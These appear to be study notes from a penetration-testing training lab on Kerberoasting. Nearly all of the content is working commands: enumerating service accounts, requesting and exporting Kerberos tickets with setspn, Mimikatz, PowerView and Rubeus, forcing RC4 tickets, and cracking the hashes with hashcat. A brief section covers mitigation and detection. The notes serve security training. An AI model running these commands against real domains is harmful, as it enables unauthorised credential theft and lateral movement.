## Enumerating SPN's with setspn.exe
```shell-session
setspn.exe -Q */*
```

**Targeting a Single User
```shell-session
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

**Retrieving All Tickets Using setspn.exe
```shell-session
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Extracting Tickets from Memory with Mimikatz
```shell-session
base64 /out:true
kerberos::list /export
```

**Preparing the Base64 Blob for Cracking
```shell-session
echo "<base64 blob>" |  tr -d \\n 
```

**Placing the Output into a File as .kirbi
```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

**Extracting the Kerberos Ticket using kirbi2john.py
```shell-session
python2.7 kirbi2john.py sqldev.kirbi
```

**Modifying crack_file for Hashcat
```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

**Viewing the Prepared Hash
```shell-session
cat sqldev_tgs_hashcat
```

**Cracking the Hash with Hashcat
```shell-session
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## Automated / Tool Based Route
**Using PowerView to Enumerate SPN Accounts
```shell-session
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

**Using PowerView to Target a Specific User
```shell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

**Exporting All Tickets to a CSV File
```shell-session
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

**Viewing the Contents of the .CSV File
```shell-session
cat .\ilfreight_tgs.csv
```

**Using Rubeus
```shell-session
.\Rubeus.exe
```

**Using the /stats Flag
```shell-session
.\Rubeus.exe kerberoast /stats
```

**Using the /nowrap Flag
```shell-session
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
- High value targets
- nowrap makes it easier to copy for Hashcat

If hash starts with $krb5tgs$23$*, it is RC4 (easier to crack)
$krb5tgs$17$* = AES-128
$krb5tgs$18$* = AES-256

**Check encryption with PowerView
```shell-session
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
- msds-supportedencryptiontypes = 0 is RC4
- msds-supportedencryptiontypes = 24 is AES 128/256

**Cracking the Ticket with Hashcat & rockyou.txt
```shell-session
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

**Requesting a New Ticket
```shell-session
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

**Running Hashcat & Checking the Status of the Cracking Job
```shell-session
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

**Using the /tgtdeleg Flag (only request RC4 tickets)
```shell-session
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```

**Edit Encryption Types used by Kerberos
Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Network security: Configure encryption types allowed for Kerberos

## Mitigation & Detection
- Managed Service Accounts
- Group Managed Service Accounts
- Very long, complex passwords that automatically rotate on a set interval
- Log Kerberos Authentication
  - Group Policy > Copmuter COnfiguration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Audit Kerberos Authentication Service
 - Restrict RC4

## Continuing Onwards
- Access a host via RDP or WinRM as a local user or a local admin
- Authenticate to a remote host as an admin using a tool such as PsExec
- Gain access to a sensitive file share
- Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges
